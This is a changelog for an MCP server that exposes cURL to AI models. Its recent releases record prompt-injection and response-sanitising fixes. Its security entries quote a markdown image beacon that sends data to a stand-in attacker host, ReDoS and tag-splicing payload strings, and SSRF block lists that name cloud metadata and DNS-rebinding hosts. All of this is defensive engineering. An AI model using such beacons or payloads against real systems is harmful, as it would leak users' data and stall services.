# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Changed — `include_headers` no longer shares a stream with the body

- **cURL writes the response header block to its own file descriptor.** The flag is
  `--dump-header /dev/fd/3`, pointing at a pipe the server opens as a fourth stdio slot, so
  headers and body never travel on one stream and there is no boundary to recover from the
  response bytes. `ARCHITECTURE.md` invariant 13 leads with the strong form because of this:
  two remote-controlled regions do not share a channel. Three prior attempts to derive that
  boundary arithmetically each failed differently — a forgeable status-line scan (RC-1), a wire
  byte count applied to lossily decoded text (RC-2), and an octet index that chunked trailers
  land past (RC-17).
- **`include_headers` requires macOS.** libuv backs the extra stdio slot with `socketpair(2)`,
  so the child's fd 3 is an `AF_UNIX` socket; macOS serves `/dev/fd/N` from `fdescfs` and can
  reopen it, while Linux resolves `/dev/fd` to `/proc/self/fd`, where a socket cannot be opened
  at all. On any other platform the flag is never added: the request keeps its body and the
  result reports `headers_unsupported`. Every other tool parameter stays platform-neutral.
- **`include_headers` composes with `save_to_file` and `jq_filter` unconditionally.** The
  refusal that fired when the header boundary could not be determined is gone, because what
  those two receive is body bytes on every path — including the one where no header block
  arrived.

### Added

- `headers_unsupported` metadata field (and the matching `[mcp-curl]` notice on the plain
  branch): this host cannot capture headers. **A fact about the host, deliberately distinct
  from `headers_undetermined`, which says the origin sent no header block.** Collapsing the two
  would tell a caller auditing an origin's security headers that it sends none, on every URL.
- `header_bytes_returned`: how many origin octets survived a truncation, reported beside
  `header_bytes_received`. **Absent where the defence grew the text past the ceiling**, because
  the surviving count then cannot be stated in origin units — `headers_truncated` still reports
  the cut, and no ratio is invented. Both cuts land on a byte boundary, so header text cut
  mid-sequence ends in U+FFFD.

### Fixed

- **Response header bytes are bounded on acceptance as well as on retention.** Retention is
  capped at `LIMITS.MAX_HEADER_TEXT_BYTES` and acceptance at `LIMITS.MAX_RESPONSE_SIZE`, counted
  across stdout, stderr and the header descriptor against one memory ceiling. A redirect chain
  was measured putting 2.5 MB on this descriptor against a 64 KB usable ceiling.
- **A non-zero cURL exit is reported on the plain (non-metadata) branch.** Without it a failed
  request is byte-identical to an empty successful one. The "the body below is unaffected"
  reassurance is claimed only on a clean exit, because cURL can emit partial output before a
  non-zero exit — it writes what it has already received, and only some failures precede the
  first body byte. A non-zero exit therefore says nothing about whether the bytes below it are
  complete, which is exactly why the reassurance cannot be keyed on anything weaker.

### Removed

- `splitResponseHeaders`, the `SplitResponse` type, and `ParsedResponse.headerBytes` /
  `ParsedResponse.bodyBytes`. Nothing separates headers from body, so the offset-based split has
  no caller. **None of these were on a package entry point** — `mcp-curl` and `mcp-curl/lib`
  export only `defendText` and `DefendTextOptions` from the response module — so this is an
  internal removal, not a breaking change under `ARCHITECTURE.md` invariant 11.
- The `include_headers` + `save_to_file` / `jq_filter` refusal, and the
  "Response header boundary could not be determined" error it raised. **A caller matching on
  that message will no longer see it**, because the condition it guarded cannot occur.

## [3.4.0] - 2026-09-02

### Security

- **The defence deleted a JSON field when two of its values held the halves of one markup token.** By
  the post-processor wrap, `formatResponse` has sealed body, headers and stderr into a single JSON
  envelope, and the strip stages pair an opening token with a closing one without any notion of the
  syntax separating two fields. A body carrying `<!--` and a response header carrying `-->` therefore
  had everything between them removed — **including the whole `headers` key** — and the result was
  still valid JSON, so nothing downstream could tell. The same held for one plain JSON document whose
  sibling values carried the two halves, which is the shape `jq_query` returns. `defendForInline` now
  parses a JSON document and defends each string value separately; text that is not JSON still takes
  the undivided scan. Re-serialising indents only where indenting does not grow the document, so the
  size gate's growth bound stays sound — `formatResponse` and jq both emit two spaces and come back
  looking as they went in. Object keys are deliberately
  left undefended, because two keys defending to the same string would collapse into one — the very
  loss this fixes. See `ARCHITECTURE.md` invariant 16.

- **A quadratic scan in the response strip path could block the event loop for 82 seconds.** Four of
  the five markdown beacon patterns shared a `[^\]\n]*` label class, so a failing match attempt
  scanned forward from every `[` in the input: O(n) attempts of O(n). 256 KB of `[` measured 82.9 s,
  synchronously, on the thread serving every session — on stdio the server is dead for the duration,
  on HTTP every session stalls. The `<script`/`<style` openers had the same shape at 4.5 s. The
  patterns' own docblock claimed the 256 KB cap guaranteed "wall-clock < 100 ms on any adversarial
  input"; it was wrong by ~800×, because a byte cap bounds the input and never the cost. The ReDoS
  guard that should have caught it fed a single opener, which the pattern consumed in one match, so
  it could not fail.

  Every pass now runs over only the prefix ending at that pattern's own closing token, so a failing
  attempt cannot scan to end-of-input. **The first attempt at this bound keyed on the wrong tokens
  and closed only part of the class** — a bare `>` does not bound a closer of `</script>`, and
  excluding `[` from a markdown label does not bound a URL class ending at `)`. Review of this PR
  measured what remained: `"<script>".repeat(32000)` 1.1 s, `"<script></x>".repeat(20000)` 1.7 s,
  `"[a](https://x".repeat(19000)` 2.9 s, and `"<!--".repeat(65536)` **5.5 s** — the last a
  regression this branch introduced by removing the open-to-EOF arm without bounding what replaced
  it. All now run in 1–2 ms. The replacement flood tests were themselves toothless at a 2 s budget,
  which is recorded beside them.

  **A fourth review round found the class open from the opposite side, inside a bound that was
  computed correctly.** The region bound guarantees a closer lies ahead of every attempt; it does
  not guarantee the attempt can reach one. The opener `<script\b[^>]*>` had an attribute run that
  crossed `<`, so on `"<script".repeat(30000) + "</script>"` each opener consumed the region's only
  closer as its own tag terminator and then scanned to end-of-input for a second — **2881 ms on a
  205 KB body**. Round 2 had fixed exactly this on the *closer* and argued in writing that the
  asymmetry was safe. Both attribute runs are now `[^<>]*`. The cost of the exclusion is stated
  rather than buried: a literal `<` inside a quoted attribute value stops the balanced match, so
  the body survives as inert text — both tags still go, which is the RC-11 posture the closer has
  had since round 2. `LESSONS.md` RC-14.
- **`max_result_size` now bounds what the model actually receives, which is what invariant 14 already
  claimed.** The defence pass can make text longer — `[link removed]` is 14 bytes and the shortest
  form it replaces is 9 — and this release added a second pass at the post-processor wrap,
  downstream of every size gate. A `text/plain` body of `"[a](file:)".repeat(100)`, exactly 1000
  bytes under a 1000-byte cap, stayed inline and reached the model as **1400 bytes** with the gate
  reporting compliance. Both size gates now ask `exceedsInlineCap`, which weighs the defended form;
  over-cap saves to a file as it always did. Found by review, twice, independently.

  **Not fixed at the wrap, and the measurement is why.** By the wrap the body is sealed inside the
  metadata envelope: a *compliant* 1000-byte body arrives there as a 1057-byte text part under
  `include_metadata`, so a wrap-side cap would truncate correct responses mid-JSON, and the wrap has
  no file to save to. `LESSONS.md` RC-15.
- **Custom tools, hook short-circuits and YAML endpoints now get the full response defence.** The
  post-processor wrap ran `sanitizeAndDetect` alone — Step 2 of the five in `defendText` — so a
  `registerCustomTool()` handler returning remote markdown or HTML reached the model with
  exfiltration beacons (`![x](https://attacker/?d=…)`) and `<script>` blocks intact. For those
  channels the wrap is the *only* defence; there is no `processResponse` upstream of them.
- **A beacon inside a JSON string value no longer reaches the model.** The JSON exemption protects a
  persisted artefact — `processResponse` writes post-strip content to disk and `jq_query` reads it
  back — and that reasoning does not reach the wrap, whose channels write to no disk. What is
  persisted keeps the exemption; what is returned does not. **"Persisted keeps it" is true of the
  content types that can claim it:** the exemption is gated on the type being undetermined or
  sniffable, so a JSON body the origin declared `text/html` or `text/markdown` is treated as what it
  was declared to be and is persisted stripped. `ARCHITECTURE.md` invariant 1a states the gate and
  what it costs.

### Fixed

- **A `<script>` or `<style>` tag no longer survives a nested-splice payload.** Removing a tag can
  rejoin its neighbours into a new one — `"<scr".repeat(4) + "<script>" + "ipt>".repeat(4)` returned
  a live `<script>` — and iterating the strip exposes only one layer per pass, so the four-iteration
  fixed point moved the surviving depth to four rather than removing the class. Both the tag strip
  and the comment strip are now single left-to-right scans that test the output tail, which
  converges without iterating. Reported by CodeQL on two rounds and by CodeRabbit as a class.
- **An unclosed `<!--`, `<script>` or `<style>` no longer deletes the rest of the payload.** The
  open-to-end-of-input arm replaced with an empty string, so one unclosed opener truncated
  everything after it — silently, with no marker, no `isError` and no observable length delta.
  `"before <!-- unclosed\nafter"` returned `"before "`. Balanced blocks are still removed whole; an
  orphan opener now has its tag removed and its body kept as inert text, which satisfies the CodeQL
  incomplete-sanitization rule the arm was added for without deleting the caller's content.
- **A JSON body served with a markup `Content-Type` is no longer corrupted.** The entity decode
  turned `{"q":"a &#x22;b&#x22;"}` into `{"q":"a "b"}`, which no longer parses — and `save_to_file`
  persisted it for `jq_query` to fail on. The sniffed arm already excluded JSON bodies; the declared
  arm did not, so one mislabelled header was enough.

### Added

- **`defendText` is now a public export.** It is the full defence pipeline over a plain string, and
  the function the built-in tools call. Consumers building a non-MCP pipeline were previously
  pointed at `sanitizeAndDetect`, described as "the same defence the built-in tools apply" — it is
  one stage of it. `docs/custom-tools.md` is corrected accordingly.

### Changed

- **`contentTypeUndetermined` is a required field on `DefendTextOptions`.** Not a breaking change:
  the type and the function it configures are both new in this release, so no consumer can be
  holding the optional form. Both grammar selectors
  were optional and absence resolved to the *permissive* arm, so `defendText(text, { hostname })`
  compiled, looked defended, and ran Step 2 alone. Pass `false` when you know the content type —
  including knowing the origin sent none — and `true` when you could not determine it.

  **Omission now resolves to the strictest grammar at runtime as well.** A required field binds
  TypeScript callers and does nothing to a JavaScript one, and this release publishes the function —
  so the type alone left the permissive arm reachable by exactly the consumer it was added to
  protect. Reported independently by two reviewers on PR #33.
- Markdown link and image syntax in a `text/plain` or `text/html` tool result is now rewritten to
  `[link removed]` / `[image removed]` at the wrap. Previously this depended on `include_metadata`:
  with it true the body sat inside a JSON envelope that the exemption protected, with it false it
  did not, so the same bytes got two different treatments selected by an output-format flag.

## [3.3.0] - 2026-09-01

### Fixed

- **`include_headers` no longer corrupts the response body.** cURL's `-i` prepends the header block
  to the body on stdout, and that combined string was passed straight into body processing. Two
  consequences: `save_to_file` wrote the status line and headers above the JSON, so the saved file
  was not a valid JSON document and `jq_query` could not read it back; and `jq_filter` had to be
  rejected outright with "Cannot use jq_filter with include_headers". Headers are now split from the
  body before any body-shaped operation, so a saved file holds the body alone.

### Changed

- **`include_headers` composes with `jq_filter` and `save_to_file`.** The cross-field validation that
  rejected `include_headers` + `jq_filter` is gone — the combination now filters the body and reports
  the headers next to it. Under `include_metadata` the headers arrive as a discrete `headers` key
  rather than being embedded in `response`. In the plain, unfiltered, unsaved case the output is
  unchanged in substance: header text, blank line, body.

  Header text is server-controlled, so it goes through **the same defence pipeline as the body** —
  `defendText`, which is sanitise + injection-detect *and* the markup/markdown strip stages.
  Splitting it out does not route it around those defences. Header text is declared `text/markdown`
  for that pass — the strictest grammar — because header values are rendered by whatever the client
  renders. It is capped at `min(LIMITS.MAX_HEADER_TEXT_BYTES, max_result_size)` — it is surfaced
  inline even when the body was saved to a file, so it honours both its own ceiling and the
  caller's inline budget. Truncation is reported out of band (see **Added**), never as a
  marker inside the header text. On a redirect chain every header block is reported, as `curl -i` prints them.

  The header/body boundary comes from cURL's own `%{size_header}`, delivered on the `-w` metadata
  channel behind the unguessable per-request separator. It is never inferred from the response
  bytes: a body may legitimately *be* an HTTP transcript, so no pattern can tell a real header block
  from a body that looks like one.

### Changed — response shape under `include_headers`

- **`response` no longer contains the response headers when `include_headers` is set.** Under
  `include_metadata`, headers move from being embedded at the top of `response` to a discrete
  `headers` key. A consumer that grabbed a `Set-Cookie` or parsed `^HTTP/` out of `response` would
  now get nothing — silently, with no error, because the field still exists and still parses.

  **Released as a MINOR bump, deliberately.** This is a change to a published output shape and
  would ordinarily be a MAJOR. It is not treated as one because this package has no consumers:
  the rule exists to protect people pinning to the old shape, and there are none. Recording the
  decision here so it reads as a deliberate posture rather than an oversight — and so that the
  next such change, made once consumers exist, is not justified by pointing at this one.

  `mcp-curl/schema` is unaffected either way: YAML-driven endpoints pin `include_headers: false`
  (`schema/generator.ts::createToolHandler`), so no `/schema` consumer could have had headers
  inside `response`.

  Files already on disk are unaffected in either direction — `include_headers` + `save_to_file`
  wrote unparseable files before this change and `jq_query` could not read them then either, so no
  previously-written file becomes less readable.

### Added

- `headers_truncated` / `header_bytes_received` / `headers_undetermined` metadata fields, reported
  out of band so a remote cannot author them by sending the same words in a header value.
- `processor.ts::defendText` — the shared five-stage defence pipeline, so no text channel can
  assemble a shorter one.

## [3.2.0] - 2026-09-01

### Added

- **Prompt-injection hardening across every tool-response path** (PR-4 … PR-8). Response sanitisation
  expanded to cover the Variation Selector Supplement ("Sneaky Bits"), Braille blank, Hangul fillers,
  Mongolian invisibles and Arabic Letter Mark; visual-space-padding and newline runs collapsed; an
  idempotence loop defeats interleaved padding. HTML/Markdown stripping is ReDoS-hardened with a
  bounded fixed-point loop and a body-shape sniffer for tampered Content-Types. Injection detection
  now normalises NFKC before matching and logs (never redacts) to stderr.

- **Defence-in-depth response wrap** on YAML endpoints, custom tools and hook short-circuit returns
  (PR-6b), so every tool result routes through one post-processor.

- **YAML schemas sanitised at parse time** (PR-6a), closing an `ApiSchemaValidator` bypass: bidi and
  zero-width bytes can no longer reach the LLM or appear in Zod error messages.

- **`registerCustomTool()` auto-sanitises `inputSchema` field descriptions** at every depth (PR-5),
  recursing through all Zod wrapper and container types while preserving runtime invariants.

- **HTTP auth-token validation** (PR-4): `MCP_AUTH_TOKEN` must be printable ASCII and ≤4096 chars;
  the rejected token is never echoed, and bearer comparison is timing-safe.

- URL helper hardening and public-barrel symmetry (PR-1); `executeJqQuery` unit tests (PR-2);
  architecture overview and integration-test script.

### Fixed

- **`jq_filter` no longer silently misreads unsupported jq syntax.** The bare-key scanner in
  `parseJqFilter()` treated any character that was not `.` or `[` as part of a key name, so a real jq
  expression was absorbed into a key, missed, and resolved to `null`. `.data | {id, name}` returned
  `[null, null]` and `.data | {id}` returned `undefined`, with no indication that the syntax was never
  supported. Such filters now throw an error naming the offending character and listing what is
  supported. Hyphens and underscores in bare keys (`.content-type`, `.assignee_user_ids`) and bracket
  notation (`.["a|b: {c}"]`) are unaffected.

- **`applyJqFilter()` / `applyJqFilterToParsed()` no longer return `undefined`.** `JSON.stringify(undefined)`
  is `undefined`, not a string, so a missing key leaked a non-string value out of a function declared to
  return `string`. A missing path now yields the string `"null"`, matching jq's output for an absent path.
  `applySingleJqFilter()` keeps its documented `undefined`-for-missing-key contract.

- **Iterate-and-project (`.items[].id`) is now rejected instead of returning `null`.** `[]` is an array
  passthrough, not jq's iterate, so a key lookup after it landed on the array and silently resolved to
  `null`. A trailing `[]` still works; use an explicit index or slice to project.

### Documentation

- `docs/api-schema.md` advertised `jqFilter: ".data | {id, name}"` and `".data | {id}"` in two
  `filterPresets` examples. Neither could ever work — both are now supported path syntax, and the
  Response Configuration section states plainly what `jqFilter` does and does not support.

- `README.md` documents the `[]` passthrough and states that jq expression syntax is rejected.

## [3.0.0] - 2026-04-03

### Breaking Changes

- **Zod v4 upgrade** – `zod` dependency bumped from `^3.23.8` to `^4.0.0`. Consumers who have their own
  `zod@^3.x` dependency and use exported types from `mcp-curl` (e.g. `CurlExecuteInput`, `JqQueryInput`,
  `ApiSchemaValidationError`) will encounter TypeScript type mismatches. Pin your `zod` dependency to v4 or use
  type-only imports where possible.

- **`ApiSchemaValidationError.issues` type changed** – The `issues` property on `ApiSchemaValidationError` now
  carries Zod v4's `ZodIssue` type. The `invalid_type` issue no longer includes a `received` field. Code
  pattern-matching on issue structure may need updates.

- **URL validation error code changed** – Zod v4 `z.url()` emits `invalid_format` instead of `invalid_string`
  for URL format failures. Code matching on `issue.code === "invalid_string"` for URL fields will no longer match.
  Update to `issue.code === "invalid_format"`.

### Changed

- **`@modelcontextprotocol/sdk` bumped** from `^1.12.0` to `^1.29.0`. No breaking API changes in the tool
  registration surface (`server.registerTool()` is unchanged).

- **`z.string().url()` → `z.url()`** at all validation sites. The HTTP/HTTPS protocol `.refine()` guard on
  `CurlExecuteSchema.url` is preserved.

- **`z.record(z.string())` → `z.record(z.string(), z.string())`** for `headers` and `form` fields. The
  single-argument form builds silently in Zod v4 but crashes at parse time.

## [2.0.1] - 2026-02-17

### Security

- **cURL protocol restriction** – Added `--proto=http,https` to all requests as defense-in-depth alongside URL
  validation, preventing protocol confusion between Node's URL parser and cURL's parser

- **cURL size abort** – Added `--max-filesize` (10MB) to abort early when `Content-Length` exceeds the limit (cURL exit
  code 63), before data streams into Node. Chunked/streaming responses without Content-Length still rely on the
  Node-level backstop in `command-executor.ts`

- **Minimal error logging** – Server-side `console.error` now logs only `[hostname]` or `[filename]` with error class
  name. Previously could leak auth headers from `-v` mode, URLs with tokens, cURL stderr fragments, file content
  snippets, or system paths. User-facing error messages are unchanged

## [1.1.5] - 2026-01-27

### Added

- **New `jq_query` tool** - Query saved JSON files without making new HTTP requests
    - Restricted to safe directories (temp, output_dir, cwd)
    - 10MB file size limit
    - Same jq_filter syntax as curl_execute

- **Large response handling** – Automatic handling of responses up to 10MB
    - `jq_filter` parameter for extracting specific JSON data
    - Dot notation for arrays (`.results.0` same as `.results[0]`)
    - Multiple paths support (`.name,.email` returns array, max 20 paths)
    - Array slicing (`.users[0:5]`)
    - Auto-save to file when result exceeds `max_result_size` (default 500KB)
    - `save_to_file` parameter for explicit file saving
    - `output_dir` parameter with `MCP_CURL_OUTPUT_DIR` env var fallback

### Security

- **SSRF protection** – Blocks requests to private networks and internal hosts
    - Private IP ranges: 10.x, 172.16-31.x, 192.168.x, 169.254.x
    - IPv4-mapped IPv6 addresses
    - IPv6 private ranges (loopback, link-local, unique local)
    - Internal TLDs: .local, .internal, .corp, .lan, .localhost (case-insensitive)
    - Cloud metadata hostnames: `metadata.google.internal`, `instance-data.ec2.internal`, `metadata.azure.com`
    - DNS rebinding services: `*.nip.io`, `*.sslip.io`, `*.xip.io`

- **DNS rebinding prevention** – DNS resolved before validation, cURL pinned to validated IP via `--resolve`

- **Protocol whitelist** - Only `http://` and `https://` allowed; `file://`, `ftp://`, UNC paths blocked

- **Symlink security** – All paths resolved via `realpath()` before validation to prevent symlink escape attacks

- **Path traversal protection** - Explicit `..` blocking in both `output_dir` and `filepath` parameters

- **Authentication** – Optional bearer token via `MCP_AUTH_TOKEN` env var for HTTP transport

- **Rate limiting** – Dual limits prevent abuse
    - Per-hostname: 60 requests/minute
    - Per-client: 300 requests/minute total

- **Resource limits**
    - jq filter parsing timeout: 100ms (prevents ReDoS)
    - Global memory limit: 100MB across concurrent requests
    - Session idle timeout: 1 hour with automatic cleanup

- **Command allowlist** – `executeCommand()` restricted to `"curl"` only via TypeScript literal type and runtime guard

- **Input validation**
    - CRLF injection protection for headers, user-agent, auth values
    - Per-request unique metadata separator prevents response injection
    - Strict jq_filter validation (unclosed quotes/brackets, leading zeros, safe integer bounds)

- **Localhost access** – Blocked by default; `MCP_CURL_ALLOW_LOCALHOST=true` enables with port restrictions

### Changed

- Maximum response size increased to 10MB for processing (inline result limit remains configurable)
- Negative indices are no longer supported in jq_filter for simplicity and security

## [1.0.2] - 2026-01-23

### Changed

- Increased the maximum response size from 1MB to 4MB to support larger API responses

## [1.0.0] - 2025-12-12

### Added

- Initial release
- `curl_execute` tool for structured HTTP requests with typed parameters
- Support for common HTTP methods (GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS)
- Authentication options (basic auth, bearer token)
- Request customization (headers, body, form data, user agent)
- Response options (follow redirects, include headers, compressed responses)
- Timeout configuration (1-300 seconds)
- SSL verification control
- JSON metadata output option
- Built-in API documentation resource (`curl://docs/api`)
- Prompt templates for API testing and discovery
- Stdio and HTTP transport support
- Session management for HTTP transport